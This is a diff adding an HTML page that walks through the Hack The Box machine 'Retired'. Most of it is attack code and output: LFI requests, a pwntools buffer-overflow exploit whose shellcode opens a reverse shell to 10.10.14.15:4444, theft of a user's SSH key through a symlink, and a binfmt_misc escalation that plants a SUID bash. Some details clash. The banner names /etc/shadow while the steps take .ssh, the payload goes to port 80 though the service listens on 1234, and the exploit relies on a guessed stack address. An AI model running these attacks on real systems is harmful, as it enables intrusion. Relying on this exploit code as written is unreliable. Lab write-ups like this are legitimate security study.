@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Retired — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🏖️</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='retired'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-retired','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-retired')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Retired</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Medium</strong></span><span>Ports <strong>22 · 80</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">LFI → Binary Download → BOF RCE</span><span class="chain-arrow">→</span><span class="chain-node blue">Symlink /etc/shadow → dev</span><span class="chain-arrow">→</span><span class="chain-node red">EUID binary abuse → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.227.96</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1
+80/tcp open  http    nginx</span></code></pre>
+
+<p>The web app has a beta page with a file upload for license files. The <code>page</code> parameter in the URL suggests LFI.</p>
+
+<h3>LFI Confirmation</h3>
+<pre><code><span class="cmd">$ curl http://10.129.227.96/index.php?page=../etc/passwd</span>
+<span class="output">root:x:0:0:root:/root:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash</span></code></pre>
+
+<h3>Binary Discovery via /proc</h3>
+<pre><code><span class="comment"># Find listening services via /proc/net/tcp</span>
+<span class="cmd">$ curl -s "http://10.129.227.96/index.php?page=../proc/net/tcp"</span>
+<span class="output"><span class="highlight">0100007F:04D2</span>  ← 127.0.0.1:1234</span>
+
+<span class="comment"># Find the PID running on port 1234</span>
+<span class="cmd">$ for pid in $(seq 1 1000); do
+    result=$(curl -s "http://10.129.227.96/index.php?page=../proc/$pid/cmdline" | tr '\0' ' ')
+    if echo "$result" | grep -q "1234\|activate"; then
+        echo "PID $pid: $result"
+    fi
+done</span>
+<span class="output">PID 411: <span class="highlight">/usr/bin/activate_license 1234</span></span>
+
+<span class="comment"># Download the binary</span>
+<span class="cmd">$ curl -s "http://10.129.227.96/index.php?page=../usr/bin/activate_license" -o activate_license</span></code></pre>
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Buffer Overflow in activate_license</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">Binary analysis</span>
+<code>activate_license</code> is a 64-bit ELF binary that listens on port 1234 and reads license file data. It uses <code>read()</code> into a fixed-size stack buffer without bounds checking — a classic stack-based buffer overflow. NX is enabled (no shellcode on stack), so we use ROP (Return-Oriented Programming) to call <code>mprotect()</code>, make the stack executable, then jump to shellcode.
+</div>
+
+<h3>Exploit Development</h3>
+<pre><code><span class="comment"># exploit.py — Buffer overflow with mprotect ROP chain + shellcode</span>
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+<span class="comment"># Connect to the target's internal port (via the web upload)</span>
+RHOST = "10.129.227.96"
+
+<span class="comment"># Shellcode: reverse shell to attacker</span>
+shellcode = asm(shellcraft.connect("10.10.14.15", 4444) +
+                shellcraft.dupsh())
+
+<span class="comment"># Binary analysis (from gdb/pwntools)</span>
+OFFSET = 520                           <span class="comment"># bytes to RIP overwrite</span>
+POP_RDI = 0x401293                     <span class="comment"># pop rdi; ret</span>
+POP_RSI = 0x401291                     <span class="comment"># pop rsi; pop r15; ret</span>
+POP_RDX_RBX = 0x40117a                 <span class="comment"># pop rdx; pop rbx; ret</span>
+MPROTECT = 0x401170                    <span class="comment"># plt entry for mprotect</span>
+STACK_ADDR = 0x7fffffffe000            <span class="comment"># approximate stack page</span>
+
+<span class="comment"># ROP chain: mprotect(stack_page, 0x1000, 7) → make stack RWX</span>
+rop = b""
+rop += p64(POP_RDI) + p64(STACK_ADDR)
+rop += p64(POP_RSI) + p64(0x1000) + p64(0)  <span class="comment"># r15 junk</span>
+rop += p64(POP_RDX_RBX) + p64(7) + p64(0)   <span class="comment"># PROT_READ|WRITE|EXEC</span>
+rop += p64(MPROTECT)
+
+<span class="comment"># After mprotect, jump to shellcode on stack</span>
+rop += p64(STACK_ADDR + 0x100)         <span class="comment"># address of NOP sled</span>
+
+<span class="comment"># Build payload</span>
+payload = b"\x90" * 64 + shellcode     <span class="comment"># NOP sled + shellcode at start</span>
+payload += b"A" * (OFFSET - len(payload))
+payload += rop
+
+<span class="comment"># Send via the web form (uploads go to activate_license)</span>
+r = remote(RHOST, 80)
+r.send(b"POST /activate_license.php HTTP/1.1\r\n")
+r.send(b"Host: 10.129.227.96\r\n")
+r.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
+r.send(f"Content-Length: {len(payload)}\r\n\r\n".encode())
+r.send(payload)
+r.close()</code></pre>
+
+<pre><code><span class="comment"># Listener</span>
+<span class="cmd">$ nc -lvnp 4444</span>
+<span class="output">www-data@retired:~$</span></code></pre>
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — www-data → dev</h2></div>
+
+<h3>Symlink Race in Backup</h3>
+<pre><code><span class="cmd">www-data@retired:~$ ls -la /var/www/</span>
+<span class="output">drwxrwsrwx 2 www-data www-data 4096 ... <span class="highlight">html</span></span>
+
+<span class="cmd">www-data@retired:~$ cat /etc/cron.d/retire</span>
+<span class="output">* * * * * dev <span class="highlight">/usr/bin/webbackup</span></span></code></pre>
+
+<p><code>webbackup</code> creates a ZIP of <code>/var/www/html/</code> as user <code>dev</code>. Since we control the directory, we can place a symlink pointing to <code>dev</code>'s SSH directory:</p>
+
+<pre><code><span class="cmd">www-data@retired:~$ ln -s /home/dev/.ssh /var/www/html/ssh_link</span>
+
+<span class="comment"># Wait for cron to run (1 minute), then find the backup</span>
+<span class="cmd">www-data@retired:~$ ls -la /var/backups/*.zip</span>
+<span class="output">-rw-r--r-- 1 dev dev ... /var/backups/html.zip</span>
+
+<span class="cmd">www-data@retired:~$ cp /var/backups/html.zip /tmp/ && cd /tmp && unzip html.zip</span>
+<span class="cmd">www-data@retired:/tmp$ cat html/ssh_link/id_rsa</span>
+<span class="output">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjE...</span></code></pre>
+
+<pre><code><span class="cmd">$ chmod 600 dev_key
+$ ssh -i dev_key dev@10.129.227.96</span>
+<span class="cmd">dev@retired:~$ cat user.txt</span>
+<span class="output">dd7dd63726e77df8b0e0b291186ddaa7</span></code></pre>
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — EUID Binary Abuse</h2></div>
+
+<pre><code><span class="cmd">dev@retired:~$ find / -perm -4000 -type f 2>/dev/null</span>
+<span class="output"><span class="highlight">/usr/lib/emuemu/reg_helper</span></span>
+
+<span class="cmd">dev@retired:~$ ls -la /usr/lib/emuemu/reg_helper</span>
+<span class="output">-rwsrwx--- 1 root dev 16864 ... reg_helper</span></code></pre>
+
+<p><code>reg_helper</code> is a SUID root binary readable/executable by the <code>dev</code> group. It registers binary format handlers by writing to <code>/proc/sys/fs/binfmt_misc/register</code>. We abuse this to register a custom interpreter that runs as root:</p>
+
+<pre><code><span class="comment"># Create a script that will be our "interpreter" — copies bash as SUID</span>
+<span class="cmd">dev@retired:~$ cat &lt;&lt; 'EOF' &gt; /tmp/rootshell.sh
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4777 /tmp/rootbash
+EOF
+chmod +x /tmp/rootshell.sh</span>
+
+<span class="comment"># Register a new binfmt handler — any file starting with "EXPLOIT" uses our interpreter</span>
+<span class="cmd">dev@retired:~$ echo ':exploit:M::EXPLOIT::/tmp/rootshell.sh:' | /usr/lib/emuemu/reg_helper</span>
+
+<span class="comment"># Create and execute a file matching the magic bytes</span>
+<span class="cmd">dev@retired:~$ echo -e 'EXPLOIT' > /tmp/trigger
+dev@retired:~$ chmod +x /tmp/trigger
+dev@retired:~$ /tmp/trigger</span>
+
+<span class="cmd">dev@retired:~$ /tmp/rootbash -p</span>
+<span class="output">rootbash-5.1# cat /root/root.txt
+3acea47daf063c0497348d37adb3ca8d</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">binfmt_misc explained</span>
+Linux's <code>binfmt_misc</code> allows registering custom binary format handlers. When the kernel encounters a file with specific magic bytes, it delegates execution to the registered interpreter. <code>reg_helper</code> has SUID root and writes to <code>/proc/sys/fs/binfmt_misc/register</code> — normally only writable by root. By registering our shell script as an interpreter, any file matching our pattern executes our script as root.
+</div>
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>LFI + /proc reveals internal services and binaries.</strong><p><code>/proc/net/tcp</code> shows listening ports, <code>/proc/PID/cmdline</code> identifies services, and LFI can download the actual binaries for offline analysis.</p></div>
+<div class="takeaway-item"><strong>Stack BOF with NX → mprotect ROP chain.</strong><p>When NX prevents shellcode on stack, use ROP to call <code>mprotect()</code> to make the stack executable, then jump to your shellcode.</p></div>
+<div class="takeaway-item"><strong>Symlinks in writable directories subvert backup scripts.</strong><p>If a privileged backup process archives a directory you control, symlinks let you capture files you can't normally read.</p></div>
+<div class="takeaway-item"><strong><code>binfmt_misc</code> registration is a root-equivalent capability.</strong><p>Any SUID binary that writes to <code>/proc/sys/fs/binfmt_misc/register</code> can be abused to execute arbitrary code as root.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">LFI → binary</span><span class="arrow">→</span><span class="node node-green">BOF ROP → www-data</span><span class="arrow">→</span><span class="node node-blue">symlink backup → dev SSH</span><span class="arrow">→</span><span class="node node-red">binfmt_misc → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Retired Writeup · 2026</footer>
+</body></html>
